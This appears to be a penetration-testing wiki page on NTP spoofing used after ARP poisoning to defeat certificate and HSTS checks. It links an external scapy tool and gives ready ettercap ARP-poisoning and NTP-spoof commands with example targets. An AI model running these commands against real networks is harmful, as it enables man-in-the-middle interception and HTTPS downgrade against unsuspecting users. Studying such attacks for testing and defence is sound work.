# ⭕ NTP Spoofing

Distributing accurate time is a vital part of sustaining network infrastructure. It’s also a critical element of network security, both when it comes to the expiry dates on certificates and timestamped system logs used for troubleshooting.

{% hint style="info" %}
NTP Spoofing is hard to detect and the only mitigation is NTP encryption or synchronizing network time with GPS, so this type of attack is not as obvious as ARP spoofing or other types of spoofing for that matter.
{% endhint %}

#### NTP Spoofing is done after ARP spoofing and becoming the man in the middle

#### This attack can trick the victim systems to think that the web certificates or HSTS records are expired and thus they wont trust the old records anymore, in this case the attacker can run MitM attacks such as HTTPS downgrade and HSTS bypass more successfully.

{% embed url="https://github.com/crazyarashi/ntp-spoof" %}

A scapy script for spoofing NTP responses with a MITM attack

1. ARP-Cache-Poisons the target and the gateway
2. Positions your machine between target and gateway in MITM attack
3. Listens for NTP-responses from gateway to target
4. Modifies the NTP-timestamps

#### Run ARP Spoof

```
ettercap [options] [target1] [target2]
```

example:

```
ettercap -T -q -M arp::remote /172.16.0.1-254//   /172.16.0.1-254//
```

#### Run the script:

```
sudo ./ntp-spoof.py -i [interface] -t [target ip] -g [gateway ip] -d [date-time to spoof]

# example:
sudo ./ntp-spoof.py -i enp0s25 -t 192.168.1.42 -g 192.168.1.1 -d 13:37-31.12.1983
```
